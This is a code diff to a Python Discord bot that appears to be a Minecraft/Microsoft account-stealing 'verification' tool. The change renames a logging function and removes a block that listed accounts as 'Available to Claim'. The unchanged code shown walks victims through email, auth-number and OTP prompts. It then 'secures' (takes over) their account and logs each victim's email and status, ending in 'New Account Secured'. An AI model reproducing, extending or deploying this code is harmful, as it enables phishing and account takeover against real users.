@@ -14,7 +14,7 @@ from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
 from securing.auth.initial_session import get_session
-from shared.send_logs import sendLogs
+from shared.send_logs import send_logs
 from securing.auth.send_auth import send_auth
 
 class MyModalOne(ui.Modal):
@@ -42,8 +42,8 @@ class MyModalOne(ui.Modal):
                     ephemeral = True
                 )
 
-                await sendLogs(
-                    interaction.client, config,
+                await send_logs(
+                    interaction.client,
                     Embed(
                         title = f"User | {interaction.user.name} ({interaction.user.id})",
                         description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
@@ -66,8 +66,8 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await sendLogs(
-                interaction.client, config,
+            await send_logs(
+                interaction.client, 
                 Embed(
                     title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
@@ -88,8 +88,8 @@ class MyModalOne(ui.Modal):
 
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
         if "Credentials" not in emailInfo:
-            await sendLogs(
-                interaction.client, config,
+            await send_logs(
+                interaction.client,
                 Embed(
                     title = f"User | {interaction.user.name} ({interaction.user.id})",
                     description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
@@ -127,8 +127,8 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await sendLogs(
-                interaction.client, config,
+            await send_logs(
+                interaction.client,
                 Embed(
                     title = f"User | {interaction.user.name}",
                     description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
@@ -172,8 +172,8 @@ class MyModalOne(ui.Modal):
                         ephemeral = True
                     )
 
-                    await sendLogs(
-                        interaction.client, config,
+                    await send_logs(
+                        interaction.client,
                         Embed(
                             title = f"User | {interaction.user.name} ({interaction.user.id})",
                             description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
@@ -187,12 +187,12 @@ class MyModalOne(ui.Modal):
 
                 elif data["SessionState"] > 1 and data["AuthorizationState"] > 1:
 
-                    await sendLogs(
-                        interaction.client, config,
+                    await send_logs(
+                        interaction.client,
                         content="**This account is being automaticly secured**"
                     )
-                    await sendLogs(
-                        interaction.client, config,
+                    await send_logs(
+                        interaction.client,
                         Embed(
                             title = f"User | {interaction.user.name}",
                             description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
@@ -216,8 +216,8 @@ class MyModalOne(ui.Modal):
                     securedAccount = await startSecuringAccount(self.session, email, device)
 
                     if not securedAccount:
-                        await sendLogs(
-                            interaction.client, config,
+                        await send_logs(
+                            interaction.client,
                             Embed(
                                 title = f"User | {interaction.user.name} ({interaction.user.id})",
                                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
@@ -234,8 +234,8 @@ class MyModalOne(ui.Modal):
                     if mc_name == "No Minecraft":
                         secured_desc = "An account has been secured but it does not own Minecraft."
 
-                    await sendLogs(
-                        interaction.client, config,
+                    await send_logs(
+                        interaction.client,
                         Embed(
                             title="New Account Secured",
                             description=secured_desc,
@@ -254,17 +254,6 @@ class MyModalOne(ui.Modal):
                         )
                     )
 
-                    if config["claims"]["claims_enabled"]:
-                        mc_name = securedAccount["minecraft"]["name"]
-                        await sendLogs(
-                            interaction.client, config,
-                            Embed(
-                                title="Account Available to Claim",
-                                description=f"**MC Username:** `{mc_name}`\n**Claim ID:** `{securedAccount['claim_id']}`",
-                                color=0x79D990
-                            )
-                        )
-
                     return
 
                 await asyncio.sleep(1)
@@ -279,8 +268,8 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await sendLogs(
-                interaction.client, config,
+            await send_logs(
+                interaction.client,
                 Embed(
                     title = f"User | {interaction.user.name}",
                     description=f"Username | Email | Status\n```{username} | {email} | Failed to confirm for Auth```",
@@ -313,8 +302,8 @@ class MyModalOne(ui.Modal):
                     view=ButtonViewThree(),
                     ephemeral=True
                 )
-                await sendLogs(
-                    interaction.client, config,
+                await send_logs(
+                    interaction.client, 
                     Embed(
                         title=f"User | {interaction.user.name} ({interaction.user.id})",
                         description=f"**Email** | **Status** | **Reason**\n```{email} | Failed | No OTP code was sent to any proof```",
@@ -343,8 +332,8 @@ class MyModalOne(ui.Modal):
                 ephemeral = True
             )
 
-            await sendLogs(
-                interaction.client, config,
+            await send_logs(
+                interaction.client, 
                 Embed(
                     title = f"User | {interaction.user.name}",
                     description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
@@ -356,8 +345,8 @@ class MyModalOne(ui.Modal):
             )
             return
 
-        await sendLogs(
-            interaction.client, config,
+        await send_logs(
+            interaction.client, 
             Embed(
                 title = f"User | {interaction.user.name} ({interaction.user.id})",
                 description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
